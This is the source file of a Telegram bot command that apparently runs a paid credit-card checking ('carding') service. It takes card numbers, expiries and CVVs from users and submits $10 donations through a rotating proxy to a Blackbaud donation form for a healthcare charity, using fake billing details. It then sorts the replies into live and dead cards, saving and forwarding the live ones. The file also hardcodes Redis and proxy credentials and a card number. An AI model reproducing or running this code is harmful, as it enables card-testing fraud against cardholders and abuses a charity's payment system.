import os
import time
from pyrogram import Client
import requests
from requests.exceptions import ProxyError
import re
import bs4
from defs import *
from pyrogram import Client, filters
import json
import uuid

@Client.on_message(filters.command(["bb"], prefixes=[".", "/", "!"], case_sensitive=False) & filters.text)

async def sa(Client, message):
    try:
        started_time = time.time()
        verified_gps = open("groups.txt", "r")
        verified_gps = verified_gps.readlines()
        if (str(message.chat.id) + "\n" not in verified_gps and message.chat.type != "private"):
            await message.reply_text(text="""<b>This Group Is Not Verified. Talk With <code>@r0ld3x</code> And Ask For Verification.</b>""",reply_to_message_id=message.message_id)
        else:
            text = f"""
<b>〄</b> GATE: <b>BLACKBAUD 10$</b>
<b>○</b> RESULT: <b>CHECKING YOUR INPUT</b>
<b>○</b> PROCESS: <b>□□□□□□□□□□ 0% </b>
<b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a></b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
            msg = await message.reply_text(text=text,reply_to_message_id=message.message_id)
            await Client.send_chat_action(message.chat.id, "typing")
            client = pymongo.MongoClient(mongourl, serverSelectionTimeoutMS=5000)
            find = client.bot["main"].find_one({"_id": message.from_user.id})
            if isinstance(find, type(None)) == True:
                await msg.edit_text(f"""<b>Register Yourself To Use Me. Hit /takeme To Register Yourself</b>""")
            elif find['status'] == "F" or find['credits'] == "0":
                await msg.edit_text("""<b>buy paid plan to use this gate hit /buy to see my premium plans</b>""")
            elif find['status'] == "P" and find['credits'] < 2:
                await msg.edit_text("""<b>You comsumed all your credits. hit /buy to buy more credits. And now are demoted to a free user</b>""")
                maindb.update_one({'_id': message.from_user.id},{
                    '$set': {
                        "plan": "Free Plan",
                        "role": "Free User",
                        "status": "F",
                        "credits": 0,
                        }
                    }, upsert=False)
            else:
                r = redis.Redis(
                    host="redis-18001.c82.us-east-1-2.ec2.cloud.redislabs.com",
                    port=18001,
                    password="eO00qpZScxQ6u1UsZ32Y94YuZ1J7pGWR",
                )
                antispam_time = int(r.get(message.from_user.id).decode("utf-8"))
                spam_time = int(time.time()) - antispam_time
                role = find["status"]
                if role == "P" and spam_time < 20:
                    time_left = 20 - spam_time
                    await msg.edit_text(f"""<b> AntiSpam try again after {time_left}'s</b>""")
                else:
                    if message.reply_to_message is not None:
                        message.text = message.reply_to_message.text
                    input = re.findall(r"[0-9]+", message.text)
                    try:
                        if len(input) == 0:
                            raise ValueError("Your Card Is Empty")
                        cc = input[0]
                        mes = input[1]
                        ano = input[2]
                        ano1 = input[2]
                        cvv = input[3]
                    except IndexError as e:
                            await msg.edit_text("Your Card Is Incorrect Or Empty")
                    except ValueError as e:
                            await msg.edit_text("Your Card Is Empty")
                    except Exception as e:
                            await Client.send_message(chat_id=loggp, text=e)
                    else:
                        if len(input) == 3:
                            cc = input[0]
                            mes = input[1][:2]
                            ano = input[1][2:]
                            ano1 = input[1][2:]
                            cvv = input[2]
                        if len(mes) > 2:
                            ano = cvv
                            cvv = mes
                            mes = ano1
                        cc_first_letter = int(cc[0])
                        len_mes = len(mes)
                        if cc_first_letter in [1,2,7,8,9,0]:
                            await msg.edit_text("Your Card Invalid")
                        elif int(len(cc))not in [15,16]:
                            await msg.edit_text("Your Card Is To Short")
                        elif int(len(mes)) not in [2,4] or len_mes == 2 and mes > '12' or len_mes == 2 and mes < '00' or len_mes != 2:
                            await msg.edit_text("Your Card Month Is Incorrect")
                        elif int(len(ano)) not in [2,4] or len(ano) < 2 or len(ano) > 4 or len(ano) == 3:
                            await msg.edit_text("Your Card Year Is Incorrect")
                        elif cc_first_letter == 3 and len(cvv) != 4 or len(cvv) < 3 or len(cvv) > 4:
                            await msg.edit_text("Your Card Cvv Is Incorrect")
                        else: 
                            lista = cc + "|" + mes + "|" + ano + "|" + cvv
                            bin = cc[:6]
                            req = requests.Session()
                            req.proxies = {
                                "http": "http://tnfpjnnj-rotate:9krjtv3qgzmo@p.webshare.io:80/",
                                "https": "http://tnfpjnnj-rotate:9krjtv3qgzmo@p.webshare.io:80/",
                            }
                            if len(ano) == 2:
                                ano = "20" + str(ano)
                            elif len(mes) == 1:
                                mes = "0" + str(mes)
                            cc = str(cc)
                            mes = str(mes)
                            ano = str(ano)
                            cvv = str(cvv)
                            cc = "4862212062005756"
                            mes = "12"
                            ano = "2023"
                            cvv = "374"
                            res = requests.get("https://jocastabins.herokuapp.com/api/" + bin)
                            if res.status_code != requests.codes.ok or json.loads(res.text)['result'] == False:
                                await msg.edit_text("Your Card's Bin Is Invalid")   
                            elif(str(message.chat.id) + "\n"in open("bannedbin.txt", "r").readlines()):
                                await msg.edit_text("Your Card's Bin Is Banned")
                            else:
                                bin_data = json.loads(res.text)
                                # res = requests.get("https://randomuser.me/api/?nat=us&inc=name,location")
                                # random_data = json.loads(res.text)
                                # phone_number = "225"+str(random.randint(000,999))+str(random.randint(0000,9999))
                                # first_name = random_data['results'][0]['name']['first']
                                # last_name = random_data['results'][0]['name']['last']
                                # street = str(random_data['results'][0]['location']['street']['number'])+" " +random_data['results'][0]['location']['street']['name']
                                # city = random_data['results'][0]['location']['city']
                                # state = random_data['results'][0]['location']['state']
                                # zip = random_data['results'][0]['location']['postcode']
                                # vendor = bin_data["data"]["vendor"].lower()
                                # email = get_email()
                                # password = str("".join(random.choices(string.ascii_uppercase + string.digits, k=10)))
                                url= 'https://bbox.blackbaudhosting.com/webforms/components/custom.ashx?handler=blackbaud.appfx.mongo.parts.postformhandler'
                                headers = {
                                'Accept':'*/*',
                                'Accept-Language':'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
                                'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
                                'Host':'bbox.blackbaudhosting.com',
                                'Origin':'https://bbox.blackbaudhosting.com',
                                'Referer':'https://bbox.blackbaudhosting.com/webforms/custom/mongo/scripts/MongoServer.html?xdm_e=https%3A%2F%2Fwww.beebehealthcare.org&xdm_c=default9070&xdm_p=1',
                                'sec-ch-ua-mobile':'?0',
                                'sec-ch-ua-platform':'"Linux"',
                                'Sec-Fetch-Dest':'empty',
                                'Sec-Fetch-Mode':'cors',
                                'Sec-Fetch-Site':'same-origin',
                                'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
                                'X-Requested-With':'XMLHttpRequest',
                                }
                                uid = uuid.uuid1()
                                data = {
'bboxdonation$gift$GivingLevel':'rdGivingLevel5',
'bboxdonation$gift$txtAmountOther':'$10.00',
'bboxdonation$gift$txtAmountPledge':'',
'bboxdonation$gift$hdnGivingLevelButtonsEnabled':'false',
'bboxdonation$gift$hdnPledgeDuration':'',
'bboxdonation$gift$hdnPledgePayment':'',
'bboxdonation$gift$hdnGiftButtonsStyle':'',
'bboxdonation$tribute$ddTributeTypes':'2408',
'bboxdonation$tribute$txtTributeRecordName':'',
'bboxdonation$tribute$hdnAllowTributeNotification':'1',
'bboxdonation$tribute$txtFirstName':'',
'bboxdonation$tribute$txtLastName':'',
'bboxdonation$tribute$tributeAddress$ddCountry':'United States',
'bboxdonation$tribute$tributeAddress$txtAddress':'',
'bboxdonation$tribute$tributeAddress$txtCity':'',
'bboxdonation$tribute$tributeAddress$ddState':'NY',
'bboxdonation$tribute$tributeAddress$txtZip':'',
'bboxdonation$tribute$tributeAddress$txtUKCity':'',
'bboxdonation$tribute$tributeAddress$ddUKCounty':'',
'bboxdonation$tribute$tributeAddress$txtUKPostCode':'',
'bboxdonation$tribute$tributeAddress$txtCACity':'',
'bboxdonation$tribute$tributeAddress$ddCAProvince':'NY',
'bboxdonation$tribute$tributeAddress$txtCAPostCode':'',
'bboxdonation$tribute$tributeAddress$txtAUCity':'',
'bboxdonation$tribute$tributeAddress$ddAUState':'NY',
'bboxdonation$tribute$tributeAddress$txtAUPostCode':'',
'bboxdonation$tribute$tributeAddress$ddNZSuburb':'',
'bboxdonation$tribute$tributeAddress$ddNZCity':'',
'bboxdonation$tribute$tributeAddress$txtNZPostCode':'',
'bboxdonation$recurrence$ddFrequency':'2',
'bboxdonation$recurrence$ddFrequencyDate':'15',
'bboxdonation$recurrence$hdnRecurringOnly':'',
'bboxdonation$recurrence$hdnDateOptions':'[{"frequency":2,"values":"15","paymentDates":"15-11-2021"}]',
'bboxdonation$recurrence$hdnRecurringOptionValue':'15',
'bboxdonation$designation$ddDesignations':'84',
'bboxdonation$designation$txtOtherDesignation':'',
'bboxdonation$comment$txtComments':'',
'bboxdonation$billing$txtOrgName':'',
'bboxdonation$billing$txtFirstName':'Carolyn',
'bboxdonation$billing$txtLastName':'watson',
'bboxdonation$billing$txtEmail':'roldexstark@gmail.com',
'bboxdonation$billing$txtPhone':'2253687536',
'bboxdonation$billing$billingAddress$ddCountry':'United States',
'bboxdonation$billing$billingAddress$txtAddress':'3 Allen Street',
'bboxdonation$billing$billingAddress$txtCity':'New York',
'bboxdonation$billing$billingAddress$ddState':'NY',
'bboxdonation$billing$billingAddress$txtZip':'10002',
'bboxdonation$billing$billingAddress$txtUKCity':'New York',
'bboxdonation$billing$billingAddress$ddUKCounty':'',
'bboxdonation$billing$billingAddress$txtUKPostCode':'10002',
'bboxdonation$billing$billingAddress$txtCACity':'New York',
'bboxdonation$billing$billingAddress$ddCAProvince':'NY',
'bboxdonation$billing$billingAddress$txtCAPostCode':'10002',
'bboxdonation$billing$billingAddress$txtAUCity':'New York',
'bboxdonation$billing$billingAddress$ddAUState':'NY',
'bboxdonation$billing$billingAddress$txtAUPostCode':'10002',
'bboxdonation$billing$billingAddress$ddNZSuburb':'',
'bboxdonation$billing$billingAddress$ddNZCity':'',
'bboxdonation$billing$billingAddress$txtNZPostCode':'10002',
'bboxdonation$payment$txtCardholder':'caaolyn',
'bboxdonation$payment$txtCardNumber': cc,
'bboxdonation$payment$cboCardType':'5963a708-fc7f-48af-952f-16d574c4b833',
'bboxdonation$payment$cboMonth': mes,
'bboxdonation$payment$cboYear': ano,
'bboxdonation$payment$txtCSC': cvv,
'bboxdonation$payment$hdnMerchantAccountId':'69baf4b6-228e-45a3-89aa-05ce028a3f2b',
'bboxdonation$hdnJsonFieldProps':'',
'bboxdonation$hdnMongoInstanceID':'',
'bboxdonation$hdnMetaTag':'1',
'bboxdonation$hdnEmailInfo':'{}',
'bboxdonation$hdnHideDirectDebitForOneTimeGift':'',
'bboxdonation$hdnDateTimeOffset':'330',
'bboxdonation$hdnReCAPTCHASettings':'{"isEnabled":false}',
'bboxdonation$hdnMixpanelToken':'',
'bboxdonation$hdnBBCheckoutPublicKey':'',
'bboxdonation$hdnBBCheckoutTransactionID':'',
'bboxdonation$hdnBBCheckoutCardToken':'',
'bboxdonation$hdnBBCheckoutProcessNow':'',
'bboxdonation$hdnSecurePaymentClicked':'false',
'bboxdonation$hdnBBCheckoutAmount':'',
'bboxdonation$hdnBBShowDirectDebitConfirmationBox':'0',
'bboxdonation$hdnDonorCoverEnabled':'0',
'bboxdonation$hdnAuthorizedAmount':'0',
'bboxdonation$hdnDonorCoveredAmount':'0',
'bboxdonation$hdnDonorCovered':'0',
'instanceId': uid,
'partId':'199cabf0-7c8b-4b89-9d8d-f8d71dd966a4',
'srcUrl':'https://www.beebehealthcare.org/donate',
'bboxdonation$btnSubmit':'Donate',
}
                                print(data)
                                res = req.post(url, data=data , headers=headers)
                                if 'block list due to repeated authorization failures' in res.text:
                                    text = f"""
<b>〄</b> GATE: <b>BLACKBAUD 10$</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>REJECTED[❌] (PROXY ERROR)</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']}({bin_data['data']['countryInfo']['code']})[{bin_data['data']['countryInfo']['emoji']}]</b>
<b>○</b> BIN DATA: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{find['role']}]</b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                    await msg.edit_text(text)
                                    r.set(message.from_user.id, int(time.time()))
                                else:
                                    text = f"""
<b>〄</b> GATE: <b>BLACKBAUD 10$</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>ALMOST COMPLETED</b>
<b>○</b> PROCESS: <b>■■■■■■■■■■ 100%</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']}({bin_data['data']['countryInfo']['code']})[{bin_data['data']['countryInfo']['emoji']}]</b>
<b>○</b> BIN DATA: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{find['role']}]</b>
<b>○</b> TIME TAKING: <b>{get_time_taken(started_time)}'s</b>
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                    await msg.edit_text(text)
                                    try:
                                        if 'block list due to repeated authorization failures' in res.text:
                                            response = 'ERROR'
                                            r_logo = '❌'
                                            r_text = 'TOKEN MISSING'  
                                        elif isinstance(bs4.BeautifulSoup(res.text, "html.parser").find('div',{"class":"BBFormErrorBlock"}), type(None)) == True and res.status_code == requests.codes.ok:
                                            save_live(lista)
                                            response = "APPROVED"
                                            r_logo = "✅"
                                            r_text = "CVV MATCH"
                                        elif "Successful Void" in res.text or "Thank" in res.text or '"seller_message": "Payment complete."' in res.text or '"cvc_check": "pass"' in res.text or 'thank_you' in res.text or '"type":"one-time"' in res.text or '"state": "succeeded"' in res.text or "Your payment has already been processed" in res.text or 'Success' in res.text or '"status": "succeeded"' in res.text or 'donation_number=' in res.text:
                                            save_live(lista)
                                            await Client.send_message(chat_id=loggp,text=str(lista) + " #CVV")
                                            response = "APPROVED"
                                            r_logo = "✅"
                                            r_text = "CVV MATCH"
                                        elif "Insufficient funds in the account" in res.text or 'insufficient_funds' in res.text or 'Insufficient Funds' in res.text :
                                            save_live(lista)
                                            await Client.send_message(chat_id=loggp,text=str(lista) + " Insufficient")
                                            response = "APPROVED"
                                            r_logo = "✅"
                                            r_text = "LOW FUNDS"
                                        elif " it did not pass the Address Verification" in res.text:
                                            save_live(lista)
                                            Client.send_message(chat_id=loggp,text=str(lista) + " #zip")
                                            response = "APPROVED"
                                            r_logo = "✅"
                                            r_text = "ZIP INCORRECT"
                                        elif "card's security code is incorrect" in res.text or "card&#039;s security code is incorrect" in res.text or "security code is invalid" in res.text or 'CVC was incorrect' in res.text or "incorrect CVC" in res.text or 'cvc was incorrect' in res.text or 'Card Issuer Declined CVV' in res.text :
                                            save_ccn(lista)
                                            await Client.send_message(chat_id=loggp,text=str(lista) + " #CCN")
                                            response = "APPROVED"
                                            r_logo = "✅"
                                            r_text = "CVV MISMATCH"
                                        elif "card does not support this type of purchase" in res.text or 'transaction_not_allowed' in res.text or 'Transaction Not Allowed' in res.text: 
                                            response = "APPROVED"
                                            r_logo = "✅"
                                            r_text = "PURCHASE NOT ALLOWED"
                                        elif "Invalid card verification number" in res.text or 'Invalid account number' in res.text or 'Invalid Credit Card Number' in res.text:
                                            response = "REJECTED"
                                            r_logo = "❌"
                                            r_text = "CARD INCORRECT"
                                        elif "Stolen or lost card" in res.text:
                                            response = "REJECTED"
                                            r_logo = "❌"
                                            r_text = "STOLEN CARD"
                                        elif "General system failure" in res.text:
                                            response = "REJECTED"
                                            r_logo = "❌"
                                            r_text = "SYSTEM FAILURE"
                                        elif "This transaction requires authentication" in res.text:
                                            response = "REJECTED"
                                            r_logo = "❌"
                                            r_text = "3D SECURITY"
                                        elif "we cannot accept transactions using this credit card" in res.text:
                                            response = "REJECTED"
                                            r_logo = "❌"
                                            r_text = "CARD BLOCKED"
                                        elif "Not Processed" in res.text:
                                            response = "REJECTED"
                                            r_logo = "❌"
                                            r_text = "RESUBMIT"
                                        elif "Please attempt your transaction again" in res.text:
                                            response = "REJECTED"
                                            r_logo = "❌"
                                            r_text = "TRY AGAIN"
                                        elif "High risk of fraud determined for this transaction" in res.text or 'we are unable to process your transaction at this time' in res.text or 'Unable to authenticate the card information' in res.text:
                                            response = "REJECTED"
                                            r_logo = "❌"
                                            r_text = "CARD DECLINED"
                                        elif 'Do Not Honor' in res.text :
                                            response = "REJECTED"
                                            r_logo = "❌"
                                            r_text = "NO NOT HONOR"
                                        elif "Invalid expiry date" in res.text or 'Expired card' in res.text:
                                            response = "REJECTED"
                                            r_logo = "❌"
                                            r_text = "INVALID EXPIRY DATE"
                                        else:
                                            response = "NOT SURE"
                                            r_logo = "❗"
                                            r_text = bs4.BeautifulSoup(res.text, "html.parser").find('div',{"class":"BBFormErrorBlock"})
                                    except Exception as e:
                                        await Client.send_message(chat_id=loggp, text=e)
                                    else:
                                        if response is None:
                                            await msg.edit_text("PROXY DEAD PLEASE REPORT TO OWNER @r0ld3x")
                                        else:
                                            credits = find['credits']
                                            credits_left = credits - 2
                                            maindb.update_one({'_id': message.from_user.id},{'$set': {'credits': credits_left}}, upsert=False)
                                            text = f"""
<b>〄</b> GATE: <b>BLACKBAUD 10$</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>{response}[{r_logo}] ({r_text})</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']}({bin_data['data']['countryInfo']['code']})[{bin_data['data']['countryInfo']['emoji']}]</b>
<b>○</b> BIN DATA: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{find['role']}]</b>
<b>○</b> CREDITS LEFT: {credits_left}credits
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                            await msg.edit_text(text)
                                            r.set(message.from_user.id, int(time.time()))
    except ProxyError as e:
        await msg.edit_text("PROXY DEAD PLEASE REPORT TO OWNER <code>@r0ld3x</code>")
        await Client.send_message(chat_id=loggp, text="Proxy Dead In st Gate")
    except Exception as e:
        await Client.send_message(chat_id=loggp, text=e)
        print(e)
